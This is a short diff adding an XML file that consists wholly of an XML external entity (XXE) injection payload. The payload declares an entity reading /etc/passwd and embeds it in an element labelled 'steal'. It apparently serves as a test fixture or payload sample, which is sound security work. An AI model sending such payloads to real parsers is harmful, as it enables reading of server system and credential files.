@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root><q id="steal">&xxe;</q></root>
